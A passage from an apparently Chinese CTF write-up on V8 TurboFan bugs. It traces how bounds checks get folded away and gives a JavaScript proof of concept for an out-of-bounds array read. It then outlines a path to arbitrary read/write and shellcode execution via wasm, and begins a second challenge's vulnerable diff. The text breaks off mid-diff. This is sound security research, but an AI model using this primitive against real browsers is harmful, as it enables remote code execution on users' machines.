alt=""><br>在取arr[idx]之前会进行CheckBounds，然后在Simplified lower之后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          CheckBoundsParameters::Mode mode =</span><br><span class="line">              CheckBoundsParameters::kDeoptOnOutOfBounds;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            mode = CheckBoundsParameters::kAbortOnOutOfBounds;</span><br><span class="line">          &#125;</span><br><span class="line">          NodeProperties::ChangeOp(</span><br><span class="line">              node, simplified()-&gt;CheckedUint32Bounds(p.feedback(), mode));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104415.png" alt=""><br>然后在Effect linearization中被Lower成Uint32LessThan。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">EffectControlLinearizer::LowerCheckedUint32Bounds</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        Node* frame_state)</span> </span>&#123;</span><br><span class="line">  Node* index = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">  Node* limit = node-&gt;InputAt(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> CheckBoundsParameters&amp; params = CheckBoundsParametersOf(node-&gt;op());</span><br><span class="line"></span><br><span class="line">  Node* check = __ Uint32LessThan(index, limit);</span><br><span class="line">  <span class="keyword">switch</span> (params.mode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kDeoptOnOutOfBounds:</span><br><span class="line">      <span class="function">__ <span class="title">DeoptimizeIfNot</span><span class="params">(DeoptimizeReason::kOutOfBounds,</span></span></span><br><span class="line"><span class="function"><span class="params">                         params.check_parameters().feedback(), check,</span></span></span><br><span class="line"><span class="function"><span class="params">                         frame_state, IsSafetyCheck::kCriticalSafetyCheck)</span></span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kAbortOnOutOfBounds: &#123;</span><br><span class="line">      <span class="keyword">auto</span> if_abort = __ MakeDeferredLabel();</span><br><span class="line">      <span class="keyword">auto</span> done = __ MakeLabel();</span><br><span class="line"></span><br><span class="line">      <span class="function">__ <span class="title">Branch</span><span class="params">(check, &amp;done, &amp;if_abort)</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="function">__ <span class="title">Bind</span><span class="params">(&amp;if_abort)</span></span>;</span><br><span class="line">      <span class="function">__ <span class="title">Unreachable</span><span class="params">()</span></span>;</span><br><span class="line">      <span class="function">__ <span class="title">Goto</span><span class="params">(&amp;done)</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="function">__ <span class="title">Bind</span><span class="params">(&amp;done)</span></span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-112448.png" alt=""></p><h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2"></a>case 2</h4><p>那么是不是把idx直接改成4，就可以越界读写一个element呢？<br>事实上没那么简单，它们生成的IR完全不一样。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typer phase<br>我们得到的IR是这样的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-113657.png" alt=""><br>代码在<code>JSNativeContextSpecialization::BuildElementAccess</code>里<br>首先判断是否是<code>load_mode=LOAD_IGNORE_OUT_OF_BOUNDS</code><br>比较简单的一种情况就是array的index超出了array的length。<br>这样我们需要对index进行check，看是否超出了Smi::kMaxValue，引入了上面的CheckBounds节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we might need to grow the &#123;elements&#125; backing store.</span></span><br><span class="line"><span class="keyword">if</span> (keyed_mode.IsStore() &amp;&amp; IsGrowStoreMode(keyed_mode.store_mode())) &#123;</span><br><span class="line">  <span class="comment">// For growing stores we validate the &#123;index&#125; below.</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyed_mode.IsLoad() &amp;&amp;</span><br><span class="line">           keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">           CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is a valid array index, we do the actual</span></span><br><span class="line">  <span class="comment">// bounds check below and just skip the store below if it's out of</span></span><br><span class="line">  <span class="comment">// bounds for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect = graph()-&gt;NewNode(</span><br><span class="line">      simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">      jsgraph()-&gt;Constant(Smi::kMaxValue), effect, control);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is in the valid range for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect =</span><br><span class="line">      graph()-&gt;NewNode(simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">                       length, effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后还需要对index进行实际的check，也就是比较index是否小于array length，引入了一个NumberLessThan节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we can return undefined for out-of-bounds loads.</span></span><br><span class="line">      <span class="keyword">if</span> (keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">          CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">        Node* check =</span><br><span class="line">            graph()-&gt;NewNode(simplified()-&gt;NumberLessThan(), index, length);</span><br><span class="line">        Node* branch = graph()-&gt;NewNode(</span><br><span class="line">            common()-&gt;Branch(BranchHint::kTrue,</span><br><span class="line">                             IsSafetyCheck::kCriticalSafetyCheck),</span><br><span class="line">            check, control);</span><br><span class="line"></span><br><span class="line">        Node* if_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), branch);</span><br><span class="line">        Node* etrue = effect;</span><br><span class="line">        Node* vtrue;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// Perform the actual load</span></span><br><span class="line">          vtrue = etrue =</span><br><span class="line">              graph()-&gt;NewNode(simplified()-&gt;LoadElement(element_access),</span><br><span class="line">                               elements, index, etrue, if_true);</span><br></pre></td></tr></table></figure><p>然后这个节点在LoadElimination进行TyperNarrowingReducer的时候。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">  <span class="keyword">case</span> IrOpcode::kNumberLessThan: &#123;</span><br><span class="line">    <span class="comment">// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational</span></span><br><span class="line">    <span class="comment">// comparisons with the operation typer).</span></span><br><span class="line">    Type left_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type right_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (left_type.Is(Type::PlainNumber()) &amp;&amp;</span><br><span class="line">        right_type.Is(Type::PlainNumber())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (left_type.Max() &lt; right_type.Min()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_true();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left_type.Min() &gt;= right_type.Max()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_false();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于left_type即index的type信息被分析为(4,4)，right_type即array length的type信息被分析为（4,4)<br>满足<code>else if (left_type.Min() &gt;= right_type.Max())</code><br>所以kNumberLessThan的类型会被更新成false，然后在ConstantFoldingReducer时候</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">ConstantFoldingReducer::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  <span class="comment">// Check if the output type is a singleton.  In that case we already know the</span></span><br><span class="line">  <span class="comment">// result value and can simply replace the node if it's eliminable.</span></span><br><span class="line">  <span class="keyword">if</span> (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp;</span><br><span class="line">      node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123;</span><br><span class="line">    <span class="comment">// TODO(v8:5303): We must not eliminate FinishRegion here. This special</span></span><br><span class="line">    <span class="comment">// case can be removed once we have separate operators for value and</span></span><br><span class="line">    <span class="comment">// effect regions.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;opcode() == IrOpcode::kFinishRegion) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="comment">// We can only constant-fold nodes here, that are known to not cause any</span></span><br><span class="line">    <span class="comment">// side-effect, may it be a JavaScript observable side-effect or a possible</span></span><br><span class="line">    <span class="comment">// eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have</span></span><br><span class="line">    <span class="comment">// the Operator::kNoDeopt property).</span></span><br><span class="line">    Type upper = NodeProperties::GetType(node);</span><br><span class="line">    <span class="keyword">if</span> (!upper.IsNone()) &#123;</span><br><span class="line">      Node* replacement = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (upper.IsHeapConstant()) &#123;</span><br><span class="line">        replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref());</span><br></pre></td></tr></table></figure><p>被直接折叠成了false节点。<br>最后只剩下了对Smi::kMaxValue的CheckBounds。<br>然而这对我们来说毫无意义。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-115435.png" alt=""><br>所以我们的第一步就是构造PoC，bypass掉ConstantFoldingReducer，这一步其实非常简单，只要让NumberLessThan在TyperNarrowingReducer的时候，不被类型更新成false就可以了。</p><h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-121438.png" alt=""><br>idx的range取决于20和16号节点，如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#21:SpeculativeNumberBitwiseAnd[SignedSmall](#16:NumberConstant, #20:NumberConstant, #17:Checkpoint, #12:JSStackCheck)  [Type: Range(0, 4)]</span><br><span class="line">#20:NumberConstant[65535]()  [Type: Range(65535, 65535)]</span><br><span class="line">#16:NumberConstant[4]()  [Type: Range(4, 4)]</span><br></pre></td></tr></table></figure><p>经过以下的typer分析得到range为(0,4)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">SPECULATIVE_NUMBER_BINOP(NumberBitwiseAnd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECULATIVE_NUMBER_BINOP(Name)                         \</span></span><br><span class="line">  Type OperationTyper::Speculative##Name(Type lhs, Type rhs) &#123; \</span><br><span class="line">    lhs = SpeculativeToNumber(lhs);                            \</span><br><span class="line">    rhs = SpeculativeToNumber(rhs);                            \</span><br><span class="line">    <span class="keyword">return</span> Name(lhs, rhs);                                     \</span><br><span class="line">  &#125;</span><br><span class="line">---&gt;</span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberBitwiseAnd</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToInt32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> lmin = lhs.Min();</span><br><span class="line">  <span class="keyword">double</span> rmin = rhs.Min();</span><br><span class="line">  <span class="keyword">double</span> lmax = lhs.Max();</span><br><span class="line">  <span class="keyword">double</span> rmax = rhs.Max();</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">min</span> = kMinInt;</span><br><span class="line">  <span class="comment">// And-ing any two values results in a value no larger than their maximum.</span></span><br><span class="line">  <span class="comment">// Even no larger than their minimum if both values are non-negative.</span></span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">max</span> =</span><br><span class="line">      lmin &gt;= <span class="number">0</span> &amp;&amp; rmin &gt;= <span class="number">0</span> ? <span class="built_in">std</span>::<span class="built_in">min</span>(lmax, rmax) : <span class="built_in">std</span>::<span class="built_in">max</span>(lmax, rmax);</span><br><span class="line">  <span class="comment">// And-ing with a non-negative value x causes the result to be between</span></span><br><span class="line">  <span class="comment">// zero and x.</span></span><br><span class="line">  <span class="keyword">if</span> (lmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(<span class="built_in">max</span>, lmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (rmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(<span class="built_in">max</span>, rmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Range(<span class="built_in">min</span>, <span class="built_in">max</span>, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后checkbounds的range也被分析成(0,4)<br>即取index和length的range的交集。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::CheckBounds</span><span class="params">(Type index, Type length)</span> </span>&#123;</span><br><span class="line">  DCHECK(length.Is(cache_-&gt;kPositiveSafeInteger));</span><br><span class="line">  <span class="keyword">if</span> (length.Is(cache_-&gt;kSingletonZero)) <span class="keyword">return</span> Type::None();</span><br><span class="line">  Type mask = Type::Range(<span class="number">0.0</span>, length.Max() - <span class="number">1</span>, zone());</span><br><span class="line">  <span class="keyword">if</span> (index.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">    index = Type::Union(index, cache_-&gt;kSingletonZero, zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(index, mask, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">#<span class="number">35</span>:CheckBounds[VectorSlotPair(INVALID)](#<span class="number">21</span>:SpeculativeNumberBitwiseAnd, #<span class="number">34</span>:NumberConstant, #<span class="number">33</span>:LoadField, #<span class="number">12</span>:JSStackCheck)  [Type: Range(<span class="number">0</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure><p>于是NumberLessThan的left_type即CheckBounds(实际上当成index也可以理解)的范围不再是(4,4)，而是被分析成了(0,4)<br>不再满足<code>left_type.Min() &gt;= right_type.Max())</code><br>也就不会被折叠了。<br>于是最终的PoC就可以给出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(main());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了越界读写一个element的原语,接下来就是构建完整的漏洞利用。<br>思路是：<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>详细的思路参考我写的<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a> exp。</p><h2 id="wctf-independence-day"><a href="#wctf-independence-day" class="headerlink" title="wctf independence_day"></a>wctf independence_day</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/code.cc b/src/objects/code.cc</span><br><span class="line">index <span class="number">24817</span>ca65c.<span class="number">.4079</span>f6077d <span class="number">100644</span></span><br><span class="line">--- a/src/objects/code.cc</span><br><span class="line">+++ b/src/objects/code.cc</span><br><span class="line">@@ <span class="number">-925</span>,<span class="number">6</span> +<span class="number">925</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">DependentCode::InstallDependency</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> MaybeObjectHandle&amp; code,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Handle&lt;HeapObject&gt; object,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       DependencyGroup group)</span> </span>&#123;</span><br><span class="line">+<span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">   <span class="function">Handle&lt;DependentCode&gt; <span class="title">old_deps</span><span class="params">(DependentCode::GetDependentCode(object),</span></span></span><br><span class="line"><span class="function"><span class="params">                                  isolate)</span></span>;</span><br><span class="line">   Handle&lt;DependentCode&gt; new_deps =</span><br><span class="line">@@ <span class="number">-932</span>,<span class="number">6</span> +<span class="number">933</span>,<span class="number">7</span> @@ <span class="keyword">void</span> DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">   <span class="comment">// Update the list head if necessary.</span></span><br><span class="line">   <span class="keyword">if</span> (!new_deps.is_identical_to(old_deps))</span><br><span class="line">     DependentCode::SetDependentCode(object, new_deps);</span><br><span class="line">+#endif</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Handle&lt;DependentCode&gt; DependentCode::InsertWeakCode(</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">commit <span class="number">3794e5</span>f0eeee3d421cc0d2a8d8b84ac82d37f10d</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec <span class="number">15</span> <span class="number">18</span>:<span class="number">21</span>:<span class="number">08</span> <span class="number">2018</span> +<span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    strip global in realms</span><br><span class="line"></span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index <span class="number">98b</span>c56ad25..e72f528ae5 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1043</span>,<span class="number">9</span> +<span class="number">1043</span>,<span class="number">8</span> @@ <span class="function">MaybeLocal&lt;Context&gt; <span class="title">Shell::CreateRealm</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">delete</span>[] old_realms;</span></span></span><br><span class="line"><span class="function"><span class="params">   &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span></span><br><span class="line"><span class="function"><span class="params">   Local&lt;Context&gt; context =</span></span></span><br><span class="line"><span class="function"><span class="params">-      Context::New(isolate, <span class="literal">nullptr</span>, global_template, global_object);</span></span></span><br><span class="line"><span class="function"><span class="params">+      Context::New(isolate, <span class="literal">nullptr</span>, ObjectTemplate::New(isolate), v8::MaybeLocal&lt;Value&gt;());</span></span></span><br><span class="line"><span class="function"><span class="params">   DCHECK(!try_catch.HasCaught());</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">if</span> (context.IsEmpty()) <span class="keyword">return</span> MaybeLocal&lt;Context&gt;();</span></span></span><br><span class="line"><span class="function"><span class="params">   